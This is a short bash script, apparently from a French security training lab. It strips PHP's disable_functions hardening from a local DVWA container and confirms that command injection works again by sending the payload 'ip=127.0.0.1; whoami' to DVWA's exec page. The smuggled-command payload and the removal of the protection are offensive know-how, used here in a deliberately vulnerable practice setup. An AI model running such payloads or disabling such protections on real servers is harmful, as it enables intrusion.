#!/bin/bash
# restore_cmdi.sh — RESTAURE les fonctions PHP (annule disable_functions)
# Usage: bash labs_resolution/jour-01/restore_cmdi.sh
set -euo pipefail
cd "$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/../.." && pwd)"
source env.sh

echo "=========================================="
echo " restore_cmdi.sh — Restauration fonctions PHP"
echo "=========================================="

echo "[*] Suppression de la directive disable_functions..."
sg docker -c "docker exec dvwa-target bash -c \"
  sed -i '/^disable_functions = /d' /etc/php/*/apache2/php.ini
  apache2ctl restart
\""

echo "[*] Vérification..."
sg docker -c "docker exec dvwa-target bash -c \"php -r 'echo function_exists(\\\"shell_exec\\\") ? \\\"actif\\\" : \\\"inactif\\\";'\"" 2>/dev/null || {
  RESULT=$(sg docker -c "docker exec dvwa-target bash -c 'php -r \"echo function_exists(\\\"shell_exec\\\") ? \\\"actif\\\" : \\\"inactif\\\";\"'")
  echo "[*] shell_exec : $RESULT"
}

echo ""
echo "[*] Test injection :"
bash labs_resolution/jour-01/setup_dvwa.sh 2>&1 | tail -1
RESULT=$(curl -s -b /tmp/dvwa_cookie.txt \
  --data-urlencode "ip=127.0.0.1; whoami" \
  --data-urlencode "Submit=Submit" \
  "http://localhost:$DVWA_PORT/vulnerabilities/exec/" | grep -c "www-data")
echo "  Résultat(s) whoami : $RESULT"
if [ "$RESULT" -gt 0 ]; then
  echo "  ✅ Injection rétablie"
else
  echo "  ⚠️  Toujours bloqué"
fi
echo "=========================================="
